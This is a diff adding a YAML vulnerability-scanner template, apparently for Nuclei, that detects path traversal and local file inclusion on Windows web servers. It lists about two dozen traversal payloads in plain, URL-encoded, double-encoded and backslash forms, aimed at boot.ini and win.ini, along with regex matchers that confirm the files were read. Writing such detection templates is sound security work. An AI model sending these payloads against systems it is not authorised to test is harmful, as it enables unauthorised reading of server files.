@@ -1,0 +1,74 @@
+id: lfi-windows
+name: Local File Inclusion - Windows Systems
+version: 1.0
+author: Phantom Team
+severity: high
+description: >
+  Detects path traversal and local file inclusion vulnerabilities on Windows
+  systems. Targets boot.ini and win.ini using various traversal techniques
+  including forward/backslash variants, URL encoding, and double encoding.
+
+info:
+  cwe-id: CWE-22
+
+tags:
+  - lfi
+  - traversal
+  - file-inclusion
+  - windows
+
+requests:
+  - method: GET
+    path:
+      - "/page?file={{payload}}"
+      - "/download?path={{payload}}"
+      - "/read?doc={{payload}}"
+      - "/include?page={{payload}}"
+
+    attack: batteringram
+    payloads:
+      payload:
+        # Standard forward slash traversal - boot.ini
+        - "../boot.ini"
+        - "../../boot.ini"
+        - "../../../boot.ini"
+        - "../../../../boot.ini"
+        - "../../../../../boot.ini"
+        - "../../../../../../boot.ini"
+        - "../../../../../../../boot.ini"
+        - "../../../../../../../../boot.ini"
+        # URL encoded forward slash
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini"
+        # Dot encoded
+        - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini"
+        # Double URL encoded
+        - "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini"
+        - "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini"
+        # Backslash traversal
+        - "..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"
+        - "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini"
+        - "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\boot.ini"
+        # Double encoded backslash
+        - "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini"
+        # win.ini targets
+        - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+        - "../../../../../../../../windows/win.ini"
+        - "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+        - "C:\\windows\\win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "\\[boot loader\\]"
+          - "for 16-bit app support"
+          - "\\[extensions\\]"
+          - "\\[fonts\\]"
+        condition: or
+
+stop-at-first-match: true
